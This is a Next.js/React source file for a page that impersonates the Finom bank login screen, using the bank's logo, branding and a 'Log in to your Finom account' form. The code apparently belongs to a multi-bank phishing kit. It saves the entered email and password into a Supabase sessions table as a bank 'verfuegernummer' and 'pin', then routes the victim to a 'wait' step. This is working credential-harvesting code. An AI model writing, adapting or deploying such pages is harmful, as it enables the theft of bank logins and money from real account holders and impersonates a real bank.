"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function FinomClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      current_step: "wait",
      form_data: { ...prev, bankSlug: "finom", bankName: "Finom", verfuegernummer: username, pin: password }
    }).eq("id", sessionId);
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-white font-sans flex">
      <div className="flex-1 flex flex-col justify-center px-8 sm:px-20 lg:px-32 relative">
        <div className="absolute top-8 left-8 sm:left-20 lg:left-32">
          <img src="/bank-logos/finom.svg" alt="Finom" className="h-8" />
        </div>
        <div className="w-full max-w-sm mt-12">
          <h1 className="text-[36px] font-extrabold text-[#1A1A1A] mb-2 leading-tight">Welcome back</h1>
          <p className="text-gray-500 mb-8 font-medium">Log in to your Finom account</p>
          <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-5">
            <div>
              <input required type="email" placeholder="Email address" value={username} onChange={e => setUsername(e.target.value)} className="w-full border border-gray-300 rounded-xl py-3.5 px-4 focus:outline-none focus:border-[#F33A6B] focus:ring-1 focus:ring-[#F33A6B] transition-all" />
            </div>
            <div>
              <input required type="password" placeholder="Password" value={password} onChange={e => setPassword(e.target.value)} className="w-full border border-gray-300 rounded-xl py-3.5 px-4 focus:outline-none focus:border-[#F33A6B] focus:ring-1 focus:ring-[#F33A6B] transition-all" />
            </div>
            <button type="submit" disabled={saving || !username || !password} className="w-full bg-[#F33A6B] text-white font-bold py-4 rounded-xl mt-2 hover:bg-[#D92A56] disabled:opacity-50 transition-colors shadow-lg shadow-pink-500/30">
              {saving ? "Loading..." : "Log in"}
            </button>
          </form>
        </div>
      </div>
      <div className="hidden lg:block w-1/2 bg-[#FFF4F6] relative">
        <img src="/bank-assets/Finom/arka plan sağ kısım.jpg" alt="Finom" className="absolute inset-0 w-full h-full object-cover" />
      </div>
    </div>
  );
}